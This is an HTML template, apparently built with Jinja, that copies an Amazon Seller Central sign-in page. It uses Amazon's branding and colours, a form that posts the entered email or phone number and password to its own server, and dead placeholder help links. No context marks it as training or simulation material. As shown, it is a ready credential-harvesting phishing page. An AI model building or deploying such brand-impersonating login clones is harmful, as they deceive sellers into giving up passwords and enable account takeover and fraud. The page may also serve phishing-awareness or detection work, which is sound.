<!DOCTYPE html>
<html>
<head>
    <title>Amazon Seller Central - Sign In</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 0; }
        .header { background: #131921; padding: 15px; text-align: center; color: white; font-size: 24px; }
        .header span { color: #ff9900; }
        .login-container { max-width: 400px; margin: 50px auto; background: white; 
                          border: 1px solid #ddd; border-radius: 8px; padding: 30px; }
        h2 { font-size: 28px; font-weight: normal; margin-bottom: 20px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; font-size: 13px; }
        input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #888; 
                border-radius: 3px; box-sizing: border-box; font-size: 14px; }
        button { width: 100%; padding: 12px; background: #f0c14b; border: 1px solid #a88734; 
                 border-radius: 3px; cursor: pointer; font-size: 14px; }
        button:hover { background: #e7b73b; }
        .error { color: #c40000; font-size: 13px; margin-top: 10px; }
        .help { text-align: center; margin-top: 20px; font-size: 13px; }
        .help a { color: #0066c0; text-decoration: none; }
        .divider { border-top: 1px solid #e7e7e7; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="header">
        amazon<span>.com</span>
    </div>
    <div class="login-container">
        <h2>Sign in</h2>
        <form method="POST">
            <label for="email">Email or mobile phone number</label>
            <input type="text" id="email" name="username" required>
            
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
            
            <button type="submit">Sign in</button>
        </form>
        
        {% if error %}
        <p class="error">âš  {{ error }}</p>
        {% endif %}
        
        <div class="help">
            <a href="#">Forgot your password?</a>
        </div>
        
        <div class="divider"></div>
        
        <div class="help">
            New to Amazon? <a href="#">Create your Amazon account</a>
        </div>
    </div>
</body>
</html>
